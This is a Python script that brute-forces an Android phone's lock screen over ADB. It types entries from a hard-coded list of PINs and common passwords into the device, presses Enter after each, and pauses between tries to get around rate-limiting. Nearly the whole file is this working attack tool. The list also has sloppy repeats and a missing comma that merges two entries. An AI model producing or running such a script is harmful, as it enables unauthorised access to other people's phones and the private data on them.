import subprocess
import time

def run_adb_command(command):
    """Run an ADB command and return the output."""
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout
    except Exception as e:
        print(f"Error: {e}")
        return None

def try_passwords(passwords):
    """Attempt to unlock the phone with a list of passwords."""
    for i, password in enumerate(passwords):
        print(f"Trying password {i + 1}/{len(passwords)}: {password}")
        # Send the password to the device
        command = f'adb shell input text "{password}"'
        run_adb_command(command.split())
        
        # Simulate pressing the "Enter" key
        run_adb_command(["adb", "shell", "input", "keyevent", "66"])  # Keyevent 66 = Enter key
        
        # Wait a few seconds to avoid rate-limiting
        time.sleep(2)

        # Check if the phone is unlocked (manually check or modify this logic)
        print("Check if the phone is unlocked. If not, it will continue.")
        # Add a mechanism here to stop if the phone is unlocked
        # For example, a success detection can be added

if __name__ == "__main__":
    # Connect the phone
    device_list = run_adb_command(["adb", "devices"])
    if "device" not in device_list:
        print("No device connected. Please enable USB debugging and connect your phone.")
    else:
        print("Device connected.")

        # List of passwords to try
        password_list = [
             "00009", "0100", "0120", "0123", "2580", "1111", "2222", "3333", "4444", "5555",
    "6666", "7777", "8888", "9999", "768764", "098709", "1234", "4321", "000000", 
     "00001", "12345",
     "00002","00003","00004","00005","00006","00007","00008","00009","00010",
    "00011", "00012","00013","00014","00015","00016","00017","00018","00019","00020",
    "00021", "00022","00023","00024","00025","00026","00027","00028","00029","00030",
    "00031", "00032","00033","00034","00035","00036","00037","00038","00039","00040",
     "00002","00003","00004","00005","00006","00007","00008","00009","00010",
     "00002","00003","00004","00005","00006","00007","00008","00009","00010",
     "00002","00003","00004","00005","00006","00007","00008","00009","00010",
     "00002","00003","00004","00005","00006","00007","00008","00009","00010",
     "00002","00003","00004","00005","00006","00007","00008","00009","00010",
    "123456", "123123", "qwerty", "password", "abc123", "password1", "letmein", "welcome",
    "sunshine", "qwertyuiop", "iloveyou", "princess", "admin", "password123", "welcome1",
    "1q2w3e4r", "password1", "football", "monkey", "abc1234", "123qwe", "qwerty123", "111111",
    "1qaz2wsx", "qazwsx", "asdfgh", "55555", "123321", "qwerty1", "shadow", "qwert", "iloveu",
    "1q2w3e", "trustno1", "11111111", "123qweasd", "freedom", "welcome123", "password12", "qwertyui",
    "letmein1", "123abc", "1qazxsw2", "dragon", "qwerty1a", "letmein123", "12345abc", "qwerty12",
    "1q2w3e4r5t", "qwerty654", "test1234", "abc456", "abcdef", "qwerty789", "qwertyu", "asdf1234",
    "password1234", "trustno1!", "iloveyou1", "123!@#", "qwerty12a", "monkey1", "ilovemom", "test123",
    "12345qwerty", "1qaz2wsx3edc", "master", "admin123", "qwerty_1", "password1!", "1password"
            
            "password",
            
        ]

        try_passwords(password_list)



